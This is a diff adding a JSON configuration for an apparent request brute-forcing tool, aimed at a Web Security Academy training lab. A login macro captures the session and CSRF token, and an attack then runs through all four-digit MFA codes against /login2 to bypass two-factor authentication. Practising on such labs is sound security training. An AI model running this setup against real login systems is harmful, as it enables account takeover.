@@ -1,0 +1,181 @@
+{
+  "version": "1.1",
+  "request": {
+    "raw_request": "POST /login2 HTTP/2\nHost: 0aae009203f464c480cf6c6e00ef0071.web-security-academy.net\nCookie: session={{session}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36\n\ncsrf={{csrf}}&mfa-code=\u00a71234\u00a7",
+    "target": ""
+  },
+  "payloads": {
+    "current_set": 0,
+    "sets": [
+      {
+        "type_idx": 1,
+        "manual_text": "",
+        "file_path": "",
+        "num_start": 0.0,
+        "num_end": 9999.0,
+        "num_step": 1.0,
+        "num_min_int": 4,
+        "num_max_int": 4,
+        "num_min_frac": 0,
+        "num_max_frac": 0,
+        "num_sequential": true,
+        "num_decimal": true,
+        "brute_charset": "abcdefghijklmnopqrstuvwxyz",
+        "brute_min": 1,
+        "brute_max": 4,
+        "null_count": 100,
+        "filter_check": false,
+        "filter_min": 0,
+        "filter_max": 99999,
+        "repeat_count": 1,
+        "order_sequential": true,
+        "rules": [],
+        "encoding_chars": []
+      },
+      {
+        "type_idx": 0,
+        "manual_text": "",
+        "file_path": "",
+        "num_start": 0.0,
+        "num_end": 100.0,
+        "num_step": 1.0,
+        "num_min_int": 0,
+        "num_max_int": 0,
+        "num_min_frac": 0,
+        "num_max_frac": 0,
+        "num_sequential": true,
+        "num_decimal": true,
+        "brute_charset": "abcdefghijklmnopqrstuvwxyz",
+        "brute_min": 1,
+        "brute_max": 4,
+        "null_count": 100,
+        "filter_check": false,
+        "filter_min": 0,
+        "filter_max": 99999,
+        "repeat_count": 1,
+        "order_sequential": true,
+        "rules": [],
+        "encoding_chars": []
+      },
+      {
+        "type_idx": 0,
+        "manual_text": "",
+        "file_path": "",
+        "num_start": 0.0,
+        "num_end": 100.0,
+        "num_step": 1.0,
+        "num_min_int": 0,
+        "num_max_int": 0,
+        "num_min_frac": 0,
+        "num_max_frac": 0,
+        "num_sequential": true,
+        "num_decimal": true,
+        "brute_charset": "abcdefghijklmnopqrstuvwxyz",
+        "brute_min": 1,
+        "brute_max": 4,
+        "null_count": 100,
+        "filter_check": false,
+        "filter_min": 0,
+        "filter_max": 99999,
+        "repeat_count": 1,
+        "order_sequential": true,
+        "rules": [],
+        "encoding_chars": []
+      },
+      {
+        "type_idx": 0,
+        "manual_text": "",
+        "file_path": "",
+        "num_start": 0.0,
+        "num_end": 100.0,
+        "num_step": 1.0,
+        "num_min_int": 0,
+        "num_max_int": 0,
+        "num_min_frac": 0,
+        "num_max_frac": 0,
+        "num_sequential": true,
+        "num_decimal": true,
+        "brute_charset": "abcdefghijklmnopqrstuvwxyz",
+        "brute_min": 1,
+        "brute_max": 4,
+        "null_count": 100,
+        "filter_check": false,
+        "filter_min": 0,
+        "filter_max": 99999,
+        "repeat_count": 1,
+        "order_sequential": true,
+        "rules": [],
+        "encoding_chars": []
+      }
+    ]
+  },
+  "settings": {
+    "attack_type": "sniper",
+    "concurrency": 5,
+    "timeout": 15.0,
+    "follow_redirects": true,
+    "update_content_length": true,
+    "verify_ssl": false,
+    "connection_header": 0,
+    "cookie_handling": 0,
+    "proxy": "",
+    "grep_match": "",
+    "grep_exclude": "",
+    "grep_extract": "",
+    "start_index": 0,
+    "delay_check": false,
+    "delay_ms": 0,
+    "jitter_ms": 0,
+    "autopause_check": false,
+    "autopause_threshold": 5,
+    "interleave_check": false,
+    "interleave_every": 3,
+    "interleave_request": "",
+    "interleave_follow_redirects": true
+  },
+  "macros": [
+    {
+      "name": "Login + MFA Session",
+      "steps": [
+        {
+          "raw_request": "GET /login HTTP/2\nHost: 0aae009203f464c480cf6c6e00ef0071.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+          "extractions": [
+            {
+              "source": "cookie",
+              "key": "session",
+              "variable": "session",
+              "group": 0
+            },
+            {
+              "source": "body_regex",
+              "key": "name=\"csrf\" value=\"([^\"]+)\"",
+              "variable": "login_csrf",
+              "group": 1
+            }
+          ]
+        },
+        {
+          "raw_request": "POST /login HTTP/2\nHost: 0aae009203f464c480cf6c6e00ef0071.web-security-academy.net\nCookie: session={{session}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36\n\ncsrf={{login_csrf}}&username=carlos&password=montoya",
+          "extractions": [
+            {
+              "source": "cookie",
+              "key": "session",
+              "variable": "session",
+              "group": 0
+            },
+            {
+              "source": "body_regex",
+              "key": "name=\"csrf\" value=\"([^\"]+)\"",
+              "variable": "csrf",
+              "group": 1
+            }
+          ]
+        }
+      ],
+      "run_before": false,
+      "rerun_on_response": "",
+      "rerun_every": 0,
+      "run_per_request": true
+    }
+  ]
+}
